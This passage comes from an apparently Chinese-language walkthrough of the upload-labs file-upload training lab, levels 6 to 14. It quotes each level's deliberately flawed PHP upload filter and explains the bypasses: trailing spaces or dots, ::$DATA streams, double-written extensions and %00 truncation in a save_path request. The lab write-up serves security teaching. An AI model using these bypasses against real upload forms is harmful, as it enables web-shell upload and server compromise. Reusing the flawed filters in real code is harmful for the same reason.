class="string">".ini"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析源码，发现和上一题相比少了小写转化。</p></li><li><p>绕过：</p><ol><li>大小写绕过</li><li>windows命名规则绕过</li></ol></li></ul><h3 id="7-Pass-07（windows命名规则空格绕过）"><a href="#7-Pass-07（windows命名规则空格绕过）" class="headerlink" title="7. Pass-07（windows命名规则空格绕过）"></a>7. Pass-07（windows命名规则空格绕过）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>,<span class="string">".ini"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题小写转化语句又回来了，但是首尾去空格的语句删除了</p></li><li><p>绕过：<br>利用windows命名规则，构造<code>xx.php[空格]</code>的文件进行绕过，在burp那里抓包修改文件名</p></li></ul><h3 id="8-Pass-08（windows命名规则点绕过）"><a href="#8-Pass-08（windows命名规则点绕过）" class="headerlink" title="8. Pass-08（windows命名规则点绕过）"></a>8. Pass-08（windows命名规则点绕过）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>,<span class="string">".ini"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题加了首尾去空格，删去了开始的首尾去点</p></li><li><p>绕过：<br>利用windows命名规则，构造<code>xx.php.</code>的文件进行绕过</p></li></ul><h3 id="9-Pass-09（-DATA绕过）"><a href="#9-Pass-09（-DATA绕过）" class="headerlink" title="9. Pass-09（::$DATA绕过）"></a>9. Pass-09（::$DATA绕过）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>,<span class="string">".ini"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题少了去除字符串<code>::$DATA</code>的语句，这里还是利用windows的一个特性。<code>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。简单讲就是在php+windows的情况下：如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名。</code></p></li><li><p>绕过:</p><ol><li>利用刚刚分析的windows系统的特性，构造文件<code>xx.php::$DATA</code>进行绕过</li><li>利用windows命名规则点空格点绕过</li></ol></li></ul><h3 id="10-Pass-10（windows命名规则绕过点空格点）"><a href="#10-Pass-10（windows命名规则绕过点空格点）" class="headerlink" title="10. Pass-10（windows命名规则绕过点空格点）"></a>10. Pass-10（windows命名规则绕过点空格点）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>,<span class="string">".ini"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和第五题代码一模一样，分析和绕过就不写了</p></li></ul><h3 id="11-Pass-11（双写绕过）"><a href="#11-Pass-11（双写绕过）" class="headerlink" title="11. Pass-11（双写绕过）"></a>11. Pass-11（双写绕过）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>,<span class="string">"ini"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题没有了之前的去点和去空格，可能已经不是windows环境了，所以不使用windows命名规则绕过。本题使用了<code>str_ireplace</code>函数，即不区分大小写，所以不能大小写绕过，但是它是将符合的后缀替换成空格，所以可以双写绕过</p></li><li><p>绕过：<br>构造<code>xx.pphphp</code>文件进行绕过</p></li></ul><h3 id="12-Pass-12（GET型00截断）"><a href="#12-Pass-12（GET型00截断）" class="headerlink" title="12. Pass-12（GET型00截断）"></a>12. Pass-12（GET型00截断）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码大致操作是取最后一次<code>.</code>后面的后缀进行比对，如果不是<code>jpg、png、gif</code>就不允许上传，如果文件可以上传，则获取<code>save_path</code>参数然后将文件名随机重命名后加上后缀然后存储文件。这里文件路径构建时用到了另一个参数<code>save_path</code>，而且没有经过任何过滤，所以我们可以从这里下手。</p></li><li><p>绕过：<br>上传我们的php文件，然后用burp抓包修改<code>save_path</code>，在upload/后面加上1.php%00。记得修改文件后缀为允许上传的后缀名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload-labs-master&#x2F;Pass-12&#x2F;index.php?save_path&#x3D;..&#x2F;upload&#x2F;1.php%00 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.183.133</span><br></pre></td></tr></table></figure><p>%00是截断符，读取到这个符号是，就不会在往后接着读取了，这样那个文件路径赋值语句就会到此为止，不会执行后面的文件名重命名和后缀名添加了，通过这个方法，可以使文件按照我们的想法以任何文件名和后缀名存入任何路径</p></li></ul><h3 id="13-Pass-13（POST型00截断）"><a href="#13-Pass-13（POST型00截断）" class="headerlink" title="13. Pass-13（POST型00截断）"></a>13. Pass-13（POST型00截断）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题代码和上一题没有什么太大的区别，只是<code>save_path</code>由get获取，变成了post获取，绕过方法不变</p></li><li><p>绕过：<br>这题和上题一样使用00截断，但是和上一题不同的是，不是直接输入1.php%00，而是输入1.php[空格]，然后在hex那里找到对应的16进制，把20（空格的16进制）改成00即可</p></li></ul><h3 id="14-Pass-14（图片马-unpack）"><a href="#14-Pass-14（图片马-unpack）" class="headerlink" title="14. Pass-14（图片马 unpack）"></a>14. Pass-14（图片马 unpack）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 